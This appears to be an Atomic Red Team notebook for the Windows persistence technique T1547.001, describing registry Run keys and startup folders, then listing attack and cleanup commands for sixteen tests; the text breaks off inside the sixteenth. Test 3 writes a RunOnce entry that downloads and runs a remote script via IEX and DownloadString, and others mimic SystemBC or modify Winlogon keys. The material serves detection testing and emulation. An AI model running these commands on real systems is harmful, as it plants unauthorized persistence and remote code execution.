{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "eb2ba753",
   "metadata": {},
   "source": "# T1547.001 - Registry Run Keys / Startup Folder\nAdversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs."
  },
  {
   "cell_type": "markdown",
   "id": "3622925b",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ec1722a3",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Reg Key Run",
    "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8473c224",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d27d2f96",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nREG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff07cbfb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cda32aa5",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Reg Key RunOnce",
    "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ad5b628f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "20735f30",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nREG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9fe6d0a3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9f698462",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - PowerShell Registry RunOnce",
    "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\")\"'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73877e7e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "2c514e6b",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce -Name \"NextRun\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f690269",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8ae85ee5",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Suspicious vbs file run from startup Folder",
    "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "34c0c599",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "5baa196a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dab3c53e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7e10d0ad",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Suspicious jse file run from startup Folder",
    "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "867081d5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "d72360ab",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b1cbf94",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e588b175",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Suspicious bat file run from startup Folder",
    "bat files can be placed in and executed from the startup folder to maintain persistance.\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "057ab571",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "985ab3ff",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a3ea8e4e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "240b976d",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Add Executable Shortcut Link to User Startup Folder",
    "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb89a629",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "1054e0e9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8126c7ad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "84a7de51",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Add persistance via Recycle bin",
    "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d93a1403",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "01861dc8",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17a642d5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "541a3b0d",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - SystemBC Malware-as-a-Service Registry",
    "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e941c5d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "3c29fdf5",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name \"socks5_powershell\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e289ee3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4b2859a4",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value",
    "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item -ItemType Directory -path \"$env:TMP\\atomictest\\\"\nCopy-Item -path \"C:\\Windows\\System32\\calc.exe\" -destination \"$env:TMP\\atomictest\\\"\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"$env:TMP\\atomictest\\\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "785c388b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "ddced73d",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"$env:TMP\\atomictest\\\" -Recurse -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a34ad448",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "63757c91",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Change Startup Folder - HKCU Modify User Shell Folders Startup Value",
    "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item -ItemType Directory -path \"$env:TMP\\atomictest\\\"\nCopy-Item -path \"C:\\Windows\\System32\\calc.exe\" -destination \"$env:TMP\\atomictest\\\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:TMP\\atomictest\\\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc1556e9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "9e1da8b9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"$env:TMP\\atomictest\\\" -Recurse -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef608f87",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "db0fa6c1",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - HKCU - Policy Settings Explorer Run Key",
    "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\" -Value \"C:\\Windows\\System32\\calc.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4ed5ae4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "064cdce0",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\"```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a755702",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3b8dacad",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - HKLM - Policy Settings Explorer Run Key",
    "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\" -Value \"C:\\Windows\\System32\\calc.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "de44c1f5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "2a93c3dd",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\"```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30fd71b9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4d7839dd",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - HKLM - Append Command to Winlogon Userinit KEY Value",
    "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" C:\\Windows\\System32\\calc.exe\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ee3f923",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "86f2583a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8000d685",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "36467f4a",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - HKLM - Modify default System Shell - Winlogon Shell KEY Value ",
    "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \", C:\\Windows\\explorer.exe\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f4a2b2c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "6593ad4a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f36e5cd7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 15 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e5814998",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - secedit used to create a Run key in the HKLM Hive",
    "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
